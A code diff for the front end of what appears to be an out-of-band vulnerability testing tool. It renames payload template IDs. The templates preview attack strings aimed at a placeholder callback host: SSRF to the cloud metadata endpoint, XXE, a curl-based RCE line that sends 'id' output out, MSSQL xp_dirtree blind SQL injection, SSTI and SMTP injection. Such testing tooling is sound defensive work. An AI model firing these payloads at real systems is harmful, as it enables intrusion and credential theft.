@@ -16,49 +16,49 @@ import { payloadSchema, type PayloadFormValues } from '@/features/payloads/schem
 /** Available payload templates per design spec */
 const TEMPLATES = [
   {
-    id: 'ssrf_http',
+    id: 'ssrf-basic',
     label: 'SSRF HTTP',
     description: 'Server-Side Request Forgery via HTTP',
     preview: 'http://{{.token}}.{{.domain}}/{{.path}}',
     category: 'SSRF',
   },
   {
-    id: 'ssrf_cloud',
+    id: 'ssrf-cloud-metadata',
     label: 'SSRF Cloud',
     description: 'Cloud metadata endpoint probe',
     preview: 'http://169.254.169.254/latest/meta-data/?x={{.token}}.{{.domain}}',
     category: 'SSRF',
   },
   {
-    id: 'xxe_external',
+    id: 'xxe-basic',
     label: 'XXE External',
     description: 'XML External Entity injection',
     preview: '<!ENTITY % ext SYSTEM "http://{{.token}}.{{.domain}}">',
     category: 'XXE',
   },
   {
-    id: 'rce_curl',
+    id: 'rce-command',
     label: 'RCE curl',
     description: 'Remote Code Execution via curl',
     preview: 'curl http://{{.token}}.{{.domain}}/$(id)',
     category: 'RCE',
   },
   {
-    id: 'blind_sqli',
+    id: 'blind-sqli',
     label: 'Blind SQLi',
     description: 'DNS-based blind SQL injection',
     preview: "'; EXEC master..xp_dirtree '//{{.token}}.{{.domain}}/x'--",
     category: 'SQLi',
   },
   {
-    id: 'ssti',
+    id: 'ssti-template',
     label: 'SSTI',
     description: 'Server-Side Template Injection',
     preview: '{{7*7}}.{{.token}}.{{.domain}}',
     category: 'SSTI',
   },
   {
-    id: 'smtp',
+    id: 'smtp-injection',
     label: 'SMTP Injection',
     description: 'SMTP header / recipient injection',
     preview: 'From: test@{{.token}}.{{.domain}}',
@@ -373,7 +373,7 @@ function NewPayloadContent() {
   const form = useForm<PayloadFormValues>({
     resolver: zodResolver(payloadSchema),
     defaultValues: {
-      template: 'ssrf_http',
+      template: 'ssrf-basic',
       scenario: '',
       case_id: presetCaseId,
       expires_in: 86400,
@@ -422,7 +422,7 @@ function NewPayloadContent() {
 
       const createReq: import('@/types').PayloadCreateRequest = {
         case_id: data.case_id || '',
-        template: data.template,
+        template_id: data.template,
         expires_at: expiresAt,
         variables: data.scenario ? { scenario: data.scenario } : undefined,
       }
